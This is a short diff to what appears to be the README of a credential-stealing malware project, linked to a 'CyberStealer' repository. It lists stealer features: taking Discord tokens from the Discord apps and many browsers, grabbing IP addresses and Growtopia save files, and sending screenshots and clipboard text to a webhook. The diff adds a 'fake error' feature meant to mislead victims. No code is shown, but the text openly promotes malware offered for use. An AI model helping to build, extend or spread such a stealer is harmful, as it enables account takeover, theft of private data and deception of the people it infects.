@@ -5,6 +5,7 @@ Other Version: https://github.com/DedSec77/CyberStealer
 - Steal discord tokens from Discord App, DiscordCanary App, DiscordPTB App, Chrome Browser, Chrome Beta Browser,FireFox Browser, Opera Browser, OperaGX Browser, Edge Browser, Yandex Browser, Brave Browser,Vivaldi Browser, Epic Privacy Browser, 360Browser, CocCoc Browser.
 - Steal IP Address
 - Steal Growtopia save.dat
+- Can send fake error
 - Send screenshot
 - Send Clipboard text
 - Send to webhook
